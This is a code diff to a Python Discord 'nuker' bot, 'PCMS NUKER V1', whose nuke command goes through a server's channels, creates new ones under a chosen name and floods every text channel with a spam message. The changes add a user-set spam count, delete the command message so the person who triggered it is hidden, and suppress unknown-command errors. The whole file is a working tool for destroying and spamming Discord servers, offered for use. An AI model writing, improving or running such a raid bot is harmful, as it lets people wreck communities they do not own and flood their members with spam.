@@ -53,6 +53,7 @@ def icon():
                      
                      MADE BY lynoraid#0                   
                 PCMS NUKER V1
+                [[More Feautres Soon ! ( No Guild and Nick changer )]]
     
     """,Colors.red_to_blue,interval=0.0000)
 
@@ -62,6 +63,7 @@ token = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Token:")
 prefix = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Prefix:")
 channelname = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Channel name:")
 spammsg = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Message:")
+amount = int(input(Fore.LIGHTGREEN_EX+"\n > Enter The Amount Of Message Spamming (etc : 10 [ Number Accepted Only]) "))
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 
 # Event that runs when the bot is ready
@@ -77,6 +79,7 @@ async def on_ready():
 # NUKE COMMAND BY LYNO ( trash)
 @bot.command()
 async def nuke(ctx):
+    await ctx.message.delete()
     guild = ctx.guild
     channels = guild.channels
     for channel in channels:
@@ -86,8 +89,14 @@ async def nuke(ctx):
         await guild.create_text_channel(name=channelname)
 
     for channel in guild.text_channels:
-        for _ in range(5):
+        for _ in range(amount):
             await channel.send(spammsg)
+
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        return  
+    raise error
 
 try:
     bot.run(token)
